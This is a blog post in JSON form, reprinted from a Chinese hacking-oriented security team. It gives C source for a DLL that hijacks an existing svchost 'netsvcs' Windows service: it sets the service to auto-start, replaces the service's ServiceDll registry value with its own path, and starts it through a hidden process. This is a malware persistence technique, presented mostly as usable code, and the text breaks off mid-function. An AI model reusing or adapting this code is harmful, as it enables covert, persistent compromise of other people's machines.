{"type":"getPostById","data":{"title":"SVCHOST启动技术","date":"2019-12-01T13:20:58.000Z","description":"","categories":[{"name":"技术笔记","_id":"clzpq9ht6001lsger8yzb9r3x"}],"tags":[{"name":"code snippets","_id":"clzpq9hvs005qsgerafjk023i"},{"name":"reprint","_id":"clzpq9hw0005zsgerdiuu9jd1"}],"content":"<p>转自邪恶八进制信息安全团队<br>\nSVCHOST启动技术文章作者：<a href=\"http://dream2fly.net\">dream2fly.net</a></p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br><span class=\"line\">330</span><br><span class=\"line\">331</span><br><span class=\"line\">332</span><br><span class=\"line\">333</span><br><span class=\"line\">334</span><br><span class=\"line\">335</span><br><span class=\"line\">336</span><br><span class=\"line\">337</span><br><span class=\"line\">338</span><br><span class=\"line\">339</span><br><span class=\"line\">340</span><br><span class=\"line\">341</span><br><span class=\"line\">342</span><br><span class=\"line\">343</span><br><span class=\"line\">344</span><br><span class=\"line\">345</span><br><span class=\"line\">346</span><br><span class=\"line\">347</span><br><span class=\"line\">348</span><br><span class=\"line\">349</span><br><span class=\"line\">350</span><br><span class=\"line\">351</span><br><span class=\"line\">352</span><br><span class=\"line\">353</span><br><span class=\"line\">354</span><br><span class=\"line\">355</span><br><span class=\"line\">356</span><br><span class=\"line\">357</span><br><span class=\"line\">358</span><br><span class=\"line\">359</span><br><span class=\"line\">360</span><br><span class=\"line\">361</span><br><span class=\"line\">362</span><br><span class=\"line\">363</span><br><span class=\"line\">364</span><br><span class=\"line\">365</span><br><span class=\"line\">366</span><br><span class=\"line\">367</span><br><span class=\"line\">368</span><br><span class=\"line\">369</span><br><span class=\"line\">370</span><br><span class=\"line\">371</span><br><span class=\"line\">372</span><br><span class=\"line\">373</span><br><span class=\"line\">374</span><br><span class=\"line\">375</span><br><span class=\"line\">376</span><br><span class=\"line\">377</span><br><span class=\"line\">378</span><br><span class=\"line\">379</span><br><span class=\"line\">380</span><br><span class=\"line\">381</span><br><span class=\"line\">382</span><br><span class=\"line\">383</span><br><span class=\"line\">384</span><br><span class=\"line\">385</span><br><span class=\"line\">386</span><br><span class=\"line\">387</span><br><span class=\"line\">388</span><br><span class=\"line\">389</span><br><span class=\"line\">390</span><br><span class=\"line\">391</span><br><span class=\"line\">392</span><br><span class=\"line\">393</span><br><span class=\"line\">394</span><br><span class=\"line\">395</span><br><span class=\"line\">396</span><br><span class=\"line\">397</span><br><span class=\"line\">398</span><br><span class=\"line\">399</span><br><span class=\"line\">400</span><br><span class=\"line\">401</span><br><span class=\"line\">402</span><br><span class=\"line\">403</span><br><span class=\"line\">404</span><br><span class=\"line\">405</span><br><span class=\"line\">406</span><br><span class=\"line\">407</span><br><span class=\"line\">408</span><br><span class=\"line\">409</span><br><span class=\"line\">410</span><br><span class=\"line\">411</span><br><span class=\"line\">412</span><br><span class=\"line\">413</span><br><span class=\"line\">414</span><br><span class=\"line\">415</span><br><span class=\"line\">416</span><br><span class=\"line\">417</span><br><span class=\"line\">418</span><br><span class=\"line\">419</span><br><span class=\"line\">420</span><br><span class=\"line\">421</span><br><span class=\"line\">422</span><br><span class=\"line\">423</span><br><span class=\"line\">424</span><br><span class=\"line\">425</span><br><span class=\"line\">426</span><br><span class=\"line\">427</span><br><span class=\"line\">428</span><br><span class=\"line\">429</span><br><span class=\"line\">430</span><br><span class=\"line\">431</span><br><span class=\"line\">432</span><br><span class=\"line\">433</span><br><span class=\"line\">434</span><br><span class=\"line\">435</span><br><span class=\"line\">436</span><br><span class=\"line\">437</span><br><span class=\"line\">438</span><br><span class=\"line\">439</span><br><span class=\"line\">440</span><br><span class=\"line\">441</span><br><span class=\"line\">442</span><br><span class=\"line\">443</span><br><span class=\"line\">444</span><br><span class=\"line\">445</span><br><span class=\"line\">446</span><br><span class=\"line\">447</span><br><span class=\"line\">448</span><br><span class=\"line\">449</span><br><span class=\"line\">450</span><br><span class=\"line\">451</span><br><span class=\"line\">452</span><br><span class=\"line\">453</span><br><span class=\"line\">454</span><br><span class=\"line\">455</span><br><span class=\"line\">456</span><br><span class=\"line\">457</span><br><span class=\"line\">458</span><br><span class=\"line\">459</span><br><span class=\"line\">460</span><br><span class=\"line\">461</span><br><span class=\"line\">462</span><br><span class=\"line\">463</span><br><span class=\"line\">464</span><br><span class=\"line\">465</span><br><span class=\"line\">466</span><br><span class=\"line\">467</span><br><span class=\"line\">468</span><br><span class=\"line\">469</span><br><span class=\"line\">470</span><br><span class=\"line\">471</span><br><span class=\"line\">472</span><br><span class=\"line\">473</span><br><span class=\"line\">474</span><br><span class=\"line\">475</span><br><span class=\"line\">476</span><br><span class=\"line\">477</span><br><span class=\"line\">478</span><br><span class=\"line\">479</span><br><span class=\"line\">480</span><br><span class=\"line\">481</span><br><span class=\"line\">482</span><br><span class=\"line\">483</span><br><span class=\"line\">484</span><br><span class=\"line\">485</span><br><span class=\"line\">486</span><br><span class=\"line\">487</span><br><span class=\"line\">488</span><br><span class=\"line\">489</span><br><span class=\"line\">490</span><br><span class=\"line\">491</span><br><span class=\"line\">492</span><br><span class=\"line\">493</span><br><span class=\"line\">494</span><br><span class=\"line\">495</span><br><span class=\"line\">496</span><br><span class=\"line\">497</span><br><span class=\"line\">498</span><br><span class=\"line\">499</span><br><span class=\"line\">500</span><br><span class=\"line\">501</span><br><span class=\"line\">502</span><br><span class=\"line\">503</span><br><span class=\"line\">504</span><br><span class=\"line\">505</span><br><span class=\"line\">506</span><br><span class=\"line\">507</span><br><span class=\"line\">508</span><br><span class=\"line\">509</span><br><span class=\"line\">510</span><br><span class=\"line\">511</span><br><span class=\"line\">512</span><br><span class=\"line\">513</span><br><span class=\"line\">514</span><br><span class=\"line\">515</span><br><span class=\"line\">516</span><br><span class=\"line\">517</span><br><span class=\"line\">518</span><br><span class=\"line\">519</span><br><span class=\"line\">520</span><br><span class=\"line\">521</span><br><span class=\"line\">522</span><br><span class=\"line\">523</span><br><span class=\"line\">524</span><br><span class=\"line\">525</span><br><span class=\"line\">526</span><br><span class=\"line\">527</span><br><span class=\"line\">528</span><br><span class=\"line\">529</span><br><span class=\"line\">530</span><br><span class=\"line\">531</span><br><span class=\"line\">532</span><br><span class=\"line\">533</span><br><span class=\"line\">534</span><br><span class=\"line\">535</span><br><span class=\"line\">536</span><br><span class=\"line\">537</span><br><span class=\"line\">538</span><br><span class=\"line\">539</span><br><span class=\"line\">540</span><br><span class=\"line\">541</span><br><span class=\"line\">542</span><br><span class=\"line\">543</span><br><span class=\"line\">544</span><br><span class=\"line\">545</span><br><span class=\"line\">546</span><br><span class=\"line\">547</span><br><span class=\"line\">548</span><br><span class=\"line\">549</span><br><span class=\"line\">550</span><br><span class=\"line\">551</span><br><span class=\"line\">552</span><br><span class=\"line\">553</span><br><span class=\"line\">554</span><br><span class=\"line\">555</span><br><span class=\"line\">556</span><br><span class=\"line\">557</span><br><span class=\"line\">558</span><br><span class=\"line\">559</span><br><span class=\"line\">560</span><br><span class=\"line\">561</span><br><span class=\"line\">562</span><br><span class=\"line\">563</span><br><span class=\"line\">564</span><br><span class=\"line\">565</span><br><span class=\"line\">566</span><br><span class=\"line\">567</span><br><span class=\"line\">568</span><br><span class=\"line\">569</span><br><span class=\"line\">570</span><br><span class=\"line\">571</span><br><span class=\"line\">572</span><br><span class=\"line\">573</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//说明：大部门代码来自bingle的文章，感谢bingle，并加入装载自启动代码</span></span><br><span class=\"line\"><span class=\"comment\">//感谢使用，幻影光临白帽子实验室http://www.dream2fly.net/forum</span></span><br><span class=\"line\">Code Language : C</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//Service HANDLE &amp; STATUS used to get service state</span></span><br><span class=\"line\">SERVICE_STATUS_HANDLE hSrv;</span><br><span class=\"line\">DWORD dwCurrState;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//report service stat to the service control manager</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">TellSCM</span><span class=\"params\">( DWORD dwState, DWORD dwExitCode, DWORD dwProgress )</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//RealService just create a process dream2fly.net</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">ControlService</span><span class=\"params\">(DWORD dwCommand)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"> <span class=\"type\">char</span> cmd[MAX_PATH] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\"> <span class=\"keyword\">if</span> (dwCommand == SERVICE_CONTROL_CONTINUE)</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\"> <span class=\"built_in\">strcpy</span>(cmd, <span class=\"string\">&quot;net start &quot;</span>);</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(dwCommand == SERVICE_CONTROL_STOP)</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\"> <span class=\"built_in\">strcpy</span>(cmd, <span class=\"string\">&quot;net stop &quot;</span>);</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> <span class=\"built_in\">strcat</span>(cmd, stServiceCfg.szSvcName);</span><br><span class=\"line\"></span><br><span class=\"line\"> PROCESS_INFORMATION pi;</span><br><span class=\"line\"> STARTUPINFO si;</span><br><span class=\"line\"> <span class=\"built_in\">memset</span>(&amp;si,<span class=\"number\">0</span>,<span class=\"built_in\">sizeof</span>(si));</span><br><span class=\"line\"> si.dwFlags=STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;</span><br><span class=\"line\"> si.wShowWindow=SW_HIDE;</span><br><span class=\"line\"> <span class=\"keyword\">if</span>(!<span class=\"built_in\">CreateProcess</span>(<span class=\"literal\">NULL</span>, cmd, <span class=\"literal\">NULL</span>, <span class=\"literal\">NULL</span>, FALSE, <span class=\"number\">0</span>, <span class=\"literal\">NULL</span>, <span class=\"literal\">NULL</span>, &amp;si, &amp;pi))</span><br><span class=\"line\"> <span class=\"built_in\">OutputString</span>(<span class=\"string\">&quot;SvcHostDLL: CreateProcess(%s) error:%d&quot;</span>, cmd, <span class=\"built_in\">GetLastError</span>());</span><br><span class=\"line\"> <span class=\"keyword\">else</span> <span class=\"built_in\">OutputString</span>(<span class=\"string\">&quot;SvcHostDLL: CreateProcess(%s) to %d&quot;</span>, cmd, pi.dwProcessId);</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">ReplaceService</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"> <span class=\"type\">int</span> rc = <span class=\"number\">0</span>;</span><br><span class=\"line\"> HKEY hKey = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\"> <span class=\"type\">char</span> buff[<span class=\"number\">500</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"comment\">//query svchost setting</span></span><br><span class=\"line\"> <span class=\"type\">char</span> *ptr, *pSvchost = <span class=\"string\">&quot;SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Svchost&quot;</span>;</span><br><span class=\"line\"> rc = <span class=\"built_in\">RegOpenKeyEx</span>(HKEY_LOCAL_MACHINE, pSvchost, <span class=\"number\">0</span>, KEY_QUERY_VALUE, &amp;hKey);</span><br><span class=\"line\"> <span class=\"keyword\">if</span>(ERROR_SUCCESS != rc)</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\"> <span class=\"built_in\">OutputString</span>(<span class=\"string\">&quot;RegOpenKeyEx(%s) KEY_QUERY_VALUE error %d.&quot;</span>, pSvchost, rc); </span><br><span class=\"line\"> <span class=\"keyword\">throw</span> <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"> DWORD type, size = <span class=\"keyword\">sizeof</span> buff;</span><br><span class=\"line\"> rc = <span class=\"built_in\">RegQueryValueEx</span>(hKey, <span class=\"string\">&quot;netsvcs&quot;</span>, <span class=\"number\">0</span>, &amp;type, (<span class=\"type\">unsigned</span> <span class=\"type\">char</span>*)buff, &amp;size);</span><br><span class=\"line\"> <span class=\"built_in\">RegCloseKey</span>(hKey);</span><br><span class=\"line\"> <span class=\"built_in\">SetLastError</span>(rc);</span><br><span class=\"line\"> <span class=\"keyword\">if</span>(ERROR_SUCCESS != rc)</span><br><span class=\"line\"> <span class=\"keyword\">throw</span> <span class=\"string\">&quot;RegQueryValueEx(Svchost\\\\netsvcs)&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">for</span>(ptr = buff; *ptr; ptr = <span class=\"built_in\">strchr</span>(ptr, <span class=\"number\">0</span>)<span class=\"number\">+1</span>)</span><br><span class=\"line\"> <span class=\"keyword\">if</span>(<span class=\"built_in\">stricmp</span>(ptr, stServiceCfg.szSvcName) == <span class=\"number\">0</span>) <span class=\"keyword\">break</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">if</span>(*ptr == <span class=\"number\">0</span>)</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\"> <span class=\"built_in\">OutputString</span>(<span class=\"string\">&quot;you specify service name not in Svchost\\\\netsvcs, must be one of following:&quot;</span>); </span><br><span class=\"line\"> <span class=\"keyword\">for</span>(ptr = buff; *ptr; ptr = <span class=\"built_in\">strchr</span>(ptr, <span class=\"number\">0</span>)<span class=\"number\">+1</span>)</span><br><span class=\"line\"> <span class=\"built_in\">OutputString</span>(<span class=\"string\">&quot; - %s&quot;</span>, ptr);</span><br><span class=\"line\"> <span class=\"keyword\">throw</span> <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"comment\">//config service</span></span><br><span class=\"line\"> <span class=\"built_in\">strncpy</span>(buff, <span class=\"string\">&quot;SYSTEM\\\\CurrentControlSet\\\\Services\\\\&quot;</span>, <span class=\"keyword\">sizeof</span> buff);</span><br><span class=\"line\"> <span class=\"built_in\">strcat</span>(buff, stServiceCfg.szSvcName);</span><br><span class=\"line\"> rc = <span class=\"built_in\">RegOpenKeyEx</span>(HKEY_LOCAL_MACHINE, buff, <span class=\"number\">0</span>, KEY_ALL_ACCESS, &amp;hKey);</span><br><span class=\"line\"> <span class=\"keyword\">if</span>(ERROR_SUCCESS != rc)</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\"> <span class=\"built_in\">OutputString</span>(<span class=\"string\">&quot;RegOpenKeyEx(%s) KEY_SET_VALUE error %d.&quot;</span>, stServiceCfg.szSvcName, rc); </span><br><span class=\"line\"> <span class=\"keyword\">throw</span> <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"> DWORD dwValue = <span class=\"number\">2</span>;<span class=\"comment\">//auto start</span></span><br><span class=\"line\"> rc = <span class=\"built_in\">RegSetValueEx</span>(hKey, <span class=\"string\">&quot;Start&quot;</span>, <span class=\"number\">0</span>, REG_DWORD, (<span class=\"type\">unsigned</span> <span class=\"type\">char</span>*)&amp;dwValue, <span class=\"built_in\">sizeof</span>(DWORD));</span><br><span class=\"line\"> <span class=\"built_in\">SetLastError</span>(rc);</span><br><span class=\"line\"> <span class=\"keyword\">if</span>(ERROR_SUCCESS != rc)</span><br><span class=\"line\"> <span class=\"keyword\">throw</span> <span class=\"string\">&quot;RegSetValueEx(start)&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"comment\">////////////////////</span></span><br><span class=\"line\"> <span class=\"type\">char</span> szDllPath[MAX_PATH] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\"> <span class=\"keyword\">if</span>(!<span class=\"built_in\">GetModuleFileName</span>(<span class=\"built_in\">HMODULE</span>(hDll), szDllPath, <span class=\"keyword\">sizeof</span> szDllPath))</span><br><span class=\"line\"> <span class=\"keyword\">throw</span> <span class=\"string\">&quot;GetModuleFileName() get dll path&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"built_in\">LogToFile</span>(szDllPath, <span class=\"built_in\">GetLastError</span>());</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"built_in\">strcat</span>(buff, <span class=\"string\">&quot;\\\\Parameters&quot;</span>);</span><br><span class=\"line\"> rc = <span class=\"built_in\">RegOpenKeyEx</span>(HKEY_LOCAL_MACHINE, buff, <span class=\"number\">0</span>, KEY_ALL_ACCESS, &amp;hKey);</span><br><span class=\"line\"> <span class=\"keyword\">if</span>(ERROR_SUCCESS != rc)</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\"> <span class=\"built_in\">OutputString</span>(<span class=\"string\">&quot;RegOpenKeyEx(%s) KEY_SET_VALUE error %d.&quot;</span>, stServiceCfg.szSvcName, rc); </span><br><span class=\"line\"> <span class=\"keyword\">throw</span> <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> rc = <span class=\"built_in\">RegSetValueEx</span>(hKey, <span class=\"string\">&quot;ServiceDll&quot;</span>, <span class=\"number\">0</span>, REG_EXPAND_SZ, (<span class=\"type\">unsigned</span> <span class=\"type\">char</span>*)szDllPath, <span class=\"built_in\">strlen</span>(szDllPath)<span class=\"number\">+1</span>);</span><br><span class=\"line\"> <span class=\"built_in\">SetLastError</span>(rc);</span><br><span class=\"line\"> <span class=\"keyword\">if</span>(ERROR_SUCCESS != rc)</span><br><span class=\"line\"> <span class=\"keyword\">throw</span> <span class=\"string\">&quot;RegSetValueEx(ServiceDll)&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"built_in\">OutputString</span>(<span class=\"string\">&quot;Config service %s ok.&quot;</span>, stServiceCfg.szSvcName);</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> <span class=\"built_in\">catch</span>(<span class=\"type\">char</span> *str)</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\"> <span class=\"keyword\">if</span>(str &amp;&amp; str[<span class=\"number\">0</span>])</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\"> rc = <span class=\"built_in\">GetLastError</span>();</span><br><span class=\"line\"> <span class=\"built_in\">OutputString</span>(<span class=\"string\">&quot;%s error %d&quot;</span>, str, rc);</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"built_in\">RegCloseKey</span>(hKey);</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"comment\">//启动服务</span></span><br><span class=\"line\"> <span class=\"built_in\">ControlService</span>(SERVICE_CONTROL_CONTINUE);</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">RecoverService</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"> <span class=\"type\">int</span> rc = <span class=\"number\">0</span>;</span><br><span class=\"line\"> HKEY hKey = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">LogToFile</span>(<span class=\"string\">&quot;RecoverService&quot;</span>);</span><br><span class=\"line\">  <span class=\"type\">char</span> buff[<span class=\"number\">500</span>];</span><br><span class=\"line\">  <span class=\"comment\">//config service</span></span><br><span class=\"line\">  <span class=\"built_in\">strncpy</span>(buff, <span class=\"string\">&quot;SYSTEM\\\\CurrentControlSet\\\\Services\\\\&quot;</span>, <span class=\"keyword\">sizeof</span> buff);</span><br><span class=\"line\">  <span class=\"built_in\">strcat</span>(buff, stServiceCfg.szSvcName);</span><br><span class=\"line\">  rc = <span class=\"built_in\">RegOpenKeyEx</span>(HKEY_LOCAL_MACHINE, buff, <span class=\"number\">0</span>, KEY_ALL_ACCESS, &amp;hKey);</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(ERROR_SUCCESS != rc)</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">  <span 